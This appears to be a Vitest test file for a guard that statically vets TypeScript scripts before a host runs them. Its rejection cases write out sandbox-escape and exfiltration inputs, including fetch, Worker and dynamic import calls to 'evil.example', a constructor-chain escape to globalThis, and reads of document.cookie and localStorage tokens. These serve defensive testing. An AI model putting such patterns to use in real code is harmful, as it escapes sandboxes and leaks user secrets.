import { describe, expect, it } from "vitest";
import { guardScript, type ScriptGuardOptions } from "./guard";

function expectRejected(source: string, options?: ScriptGuardOptions) {
  const result = guardScript(source, options);
  expect(result.ok, `expected rejection, but this was accepted:\n${source}`).toBe(false);
  expect(result.reason).toBeTruthy();
  return result;
}

function expectAccepted(source: string, options?: ScriptGuardOptions) {
  const result = guardScript(source, options);
  expect(result.ok, `expected acceptance, but it was rejected: ${result.reason}\n${source}`).toBe(
    true
  );
  return result;
}

describe("the scripting dialect: TypeScript with classes", () => {
  it("accepts a class-based script the way the host's users write them", () => {
    expectAccepted(`
      interface BuildContext {
        box(size: { w: number; h: number; d: number }): Solid;
      }

      type Millimetres = number;

      export class BasePlate {
        private readonly thickness: Millimetres = 5;

        constructor(
          private width: Millimetres,
          private height: Millimetres = 60,
        ) {}

        build(ctx: BuildContext): Solid {
          const size = { w: this.width, h: this.height, d: this.thickness };
          return ctx.box(size);
        }
      }
    `);
  });

  it("accepts generics, async, enums and `as` casts", () => {
    expectAccepted(`
      enum Axis { X = 0, Y = 1 }

      export async function pick<T extends { id: number }>(items: T[], axis: Axis): Promise<T> {
        const sorted = [...items].sort((a, b) => a.id - b.id);
        const first = sorted[axis] as T;
        return await Promise.resolve(first);
      }
    `);
  });

  it("permits `this`, which guardCode cannot", () => {
    // The whole reason guardScript exists: a class without `this` is not a class.
    expectAccepted("export class A { x = 1; get(): number { return this.x; } }");
  });
});

describe("a type is not a reference", () => {
  // `let el: Window` names a blocked global in a *type* position. It is erased
  // before anything runs, so rejecting it would be a false positive.
  it("accepts blocked names in type positions", () => {
    expectAccepted(`
      export function render(target: Document, source: Window): void {
        log(target, source);
      }
    `);
    expectAccepted("export type Handler = (event: Event, target: Document) => void;");
    expectAccepted("export class A implements Window { close(): void {} }");
    expectAccepted("const value = payload as Location;");
  });

  it("still rejects the same names in value positions", () => {
    expectRejected("export function f(): void { const d: Document = document; }");
    expectRejected("export class A { run(): void { const w = window; } }");
  });
});

describe("the blocklist applies exactly as it does to evaluate code", () => {
  it("rejects the network", () => {
    expectRejected(`export class A { async run() { return fetch("https://evil.example"); } }`);
    expectRejected("const img = new Image(); img.src = secret;");
    expectRejected(`new Worker("https://evil.example/w.js");`);
  });

  it("rejects code generation and the constructor chain", () => {
    expectRejected(`eval("1+1");`);
    expectRejected(`const f = new Function("return 1");`);
    expectRejected(`const g = ({}).constructor.constructor("return globalThis")();`);
    expectRejected("const p = Object.getPrototypeOf(api);");
  });

  it("rejects storage, dialogs and the global object", () => {
    expectRejected(`localStorage.setItem("k", "v");`);
    expectRejected(`alert("hi");`);
    expectRejected("export const g = globalThis;");
  });

  it("rejects dynamic import", () => {
    expectRejected(`const mod = await import("https://evil.example/x.js");`);
  });

  it("keeps the scope rule: a declared name shadows the global", () => {
    expectAccepted("export class A { run() { const open = this.items.filter(Boolean); return open; } }");
    expectRejected("export class A { run() { return open('https://evil.example'); } }");
  });

  it("honours extraBlocked, so the host can seal its own globals", () => {
    expectAccepted("export const x = __appStore.value;");
    expectRejected("export const x = __appStore.value;", { extraBlocked: ["__appStore"] });
  });
});

describe("nothing hides in a TypeScript-only position", () => {
  // Skipping type fields is the riskiest part of the TS support: skip one field
  // too many and executable code slips past unchecked. Each of these puts a
  // forbidden call somewhere the type-skipping could plausibly have swallowed.
  const smuggled: Array<[string, string]> = [
    ["parameter property default", `export class A { constructor(private x = fetch("https://evil")) {} }`],
    ["enum initialiser", `enum E { A = eval("1") }`],
    ["decorator", `class A { @document.foo bar() {} }`],
    ["static block", `export class A { static { fetch("https://evil"); } }`],
    ["class field initialiser", `export class A { x = window.name; }`],
    ["as expression", `const x = (window as any).secret;`],
    ["non-null assertion", `const x = document!.cookie;`],
    ["computed class key", `export class A { [document.title]() {} }`],
    ["default export", `export default fetch("https://evil");`],
    ["template literal", "const x = `${localStorage.token}`;"],
  ];

  it.each(smuggled)("blocks a forbidden call in a %s", (_where, source) => {
    const result = guardScript(source);
    expect(result.ok, `not blocked: ${source}`).toBe(false);
    // A parse failure would also "reject" it – and would mean the guard never
    // looked at the code at all. These must be rejected on their merits.
    expect(result.reason, `only rejected because the parser choked: ${source}`).not.toMatch(
      /syntax error/i
    );
  });
});

describe("static imports", () => {
  it("rejects imports by default – a free import is an escape", () => {
    const result = expectRejected(`import { evil } from "https://evil.example/x.js";`);
    expect(result.reason).toMatch(/import/i);
  });

  it("allows exactly the modules the host permits", () => {
    const options = { allowImportsFrom: ["@fieldskript/std"] };
    expectAccepted(`import { box } from "@fieldskript/std";\nexport const s = box(1, 2, 3);`, options);
    expectRejected(`import { readFile } from "node:fs";`, options);
  });
});

describe("what the parser cannot read, it rejects", () => {
  // acorn-typescript does not implement the `satisfies` operator. The guard
  // therefore cannot inspect such a script – and rejects it. That is the
  // property that matters: unparseable code fails closed, it is never waved
  // through unchecked. The cost is a false rejection, which the model sees and
  // can work around by dropping the operator.
  it("rejects `satisfies` rather than passing it unchecked", () => {
    const result = guardScript(`const x = { a: 1 } satisfies Record<string, number>;`);
    expect(result.ok).toBe(false);
    expect(result.reason).toMatch(/syntax error/i);
  });

  it("never accepts code it failed to parse", () => {
    for (const source of ["const x = ;", "class {", "@@@"]) {
      expect(guardScript(source).ok).toBe(false);
    }
  });
});

describe("limits and diagnostics", () => {
  it("allows a longer source than the evaluate tool does", () => {
    // Scripts are files, not one-liners – the default budget reflects that.
    const long = `export const values = [${Array.from({ length: 900 }, (_, i) => i).join(", ")}];`;
    expect(long.length).toBeGreaterThan(3000);
    expectAccepted(long);
  });

  it("reports a syntax error instead of throwing", () => {
    const result = guardScript("export class {");
    expect(result.ok).toBe(false);
    expect(result.reason).toMatch(/syntax error/i);
  });

  it("reports the line of the violation without an offset", () => {
    const result = guardScript("const a = 1;\nconst b = 2;\nconst c = window;");
    expect(result.ok).toBe(false);
    expect(result.at?.line).toBe(3);
  });
});
